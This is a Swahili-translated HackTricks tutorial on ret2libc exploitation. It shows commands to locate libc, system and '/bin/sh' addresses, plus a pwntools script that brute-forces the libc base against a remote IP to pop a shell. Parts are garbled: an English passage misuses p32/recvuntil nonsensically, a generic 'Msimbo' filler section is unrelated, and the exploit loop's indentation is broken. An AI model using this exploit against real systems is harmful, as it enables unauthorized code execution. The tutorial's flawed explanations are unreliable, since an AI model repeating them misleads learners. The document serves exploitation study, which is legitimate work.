<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


**Ikiwa umepata faili ya kudukuliwa na unafikiri unaweza kuitumia Ret2Lib kuikexploit, hapa kuna hatua za msingi unazoweza kufuata.**

# Ikiwa uko **ndani** ya **mwenyeji**

## Unaweza kupata **anwani ya lib**c
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Ikiwa unataka kuhakiki ikiwa ASLR inabadilisha anwani ya libc, unaweza kufanya hivi:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Pata kigezo cha kazi ya mfumo (system function)

To get the offset of the system function, we can use the `objdump` command to analyze the binary file of the target program. The system function is usually located in the libc library, so we need to find the offset of the system function within the libc library.

1. First, we need to identify the libc library used by the target program. We can do this by running the `ldd` command followed by the path to the target program binary file. For example:

   ```bash
   ldd /path/to/target_program
   ```

   This will display the shared libraries used by the target program, including the libc library.

2. Once we have identified the libc library, we can use the `objdump` command to analyze the libc library file. We need to find the offset of the system function within the libc library. For example:

   ```bash
   objdump -T /path/to/libc.so | grep "system"
   ```

   This command will display the offset of the system function within the libc library.

By obtaining the offset of the system function, we can use it in our exploit to redirect program execution to the system function and execute arbitrary commands.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## Pata kigezo cha "/bin/sh"

To get the offset of "/bin/sh", we can use the `pwn` library in Python. The `pwn` library provides a function called `p32` that converts an integer to a little-endian byte string. We can use this function to convert the address of "/bin/sh" to a byte string and then search for it in the memory dump.

Here is an example code snippet that demonstrates how to get the offset of "/bin/sh":

```python
from pwn import *

# Create a process to run the vulnerable program
p = process('./vulnerable_program')

# Find the address of "/bin/sh" in memory
bin_sh_address = p32(0x804a030)  # Replace with the actual address of "/bin/sh"

# Search for the address in the memory dump
offset = p.recvuntil(bin_sh_address).count(b'A')

# Print the offset
print(f"Offset of '/bin/sh': {offset}")
```

Replace `0x804a030` with the actual address of "/bin/sh" in your target system. Run the code, and it will print the offset of "/bin/sh" in the memory dump.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

Ikiwa mchakato unazalisha **watoto** kila wakati unapozungumza naye (seva ya mtandao), jaribu **kusoma** faili hiyo (labda utahitaji kuwa na ruhusa ya mizizi).

Hapa unaweza kupata **mahali hasa ambapo libc imepakiwa** ndani ya mchakato na **mahali ambapo itapakiwa** kwa kila mtoto wa mchakato.

![](<../../.gitbook/assets/image (95).png>)

Katika kesi hii, imepakiwa katika **0xb75dc000** (Hii itakuwa anwani ya msingi ya libc)

## Kutumia gdb-peda

Pata anwani ya kazi ya **system**, ya kazi ya **exit**, na ya neno **"/bin/sh"** kwa kutumia gdb-peda:
```
p system
p exit
find "/bin/sh"
```
# Kuvuka ASLR

Unaweza kujaribu kuvunja nguvu anwani ya msingi ya libc.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Msimbo

Msimbo ni kipande cha programu ambacho kinaweza kutekelezwa na kompyuta. Msimbo unaweza kuwa na maagizo mbalimbali ambayo kompyuta inafuata ili kufanya kazi fulani. Msimbo unaweza kuandikwa kwa lugha tofauti za programu kama vile C, Python, au Java.

Msimbo unaweza kuwa na makosa au udhaifu ambao unaweza kutumiwa na wadukuzi kuingia kwenye mfumo. Kwa hiyo, ni muhimu kwa wataalamu wa usalama wa kompyuta kuelewa jinsi ya kuchambua na kurekebisha msimbo ili kuzuia mashambulizi.

Katika uwanja wa udukuzi, wadukuzi wanaweza kutumia msimbo wa kudukua mifumo ya kompyuta. Wanaweza kutafuta makosa au udhaifu katika msimbo wa programu na kuitumia kuingia kwenye mfumo. Hii inaweza kuwa hatari kwa sababu wadukuzi wanaweza kuiba data, kuharibu mfumo, au hata kudhibiti mfumo mzima.

Kwa hiyo, ni muhimu kwa wataalamu wa usalama wa kompyuta kujifunza jinsi ya kuchambua na kurekebisha msimbo ili kuzuia mashambulizi ya wadukuzi. Kwa kufanya hivyo, wanaweza kuhakikisha kuwa mifumo ya kompyuta ni salama na salama kutoka kwa mashambulizi ya wadukuzi.
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
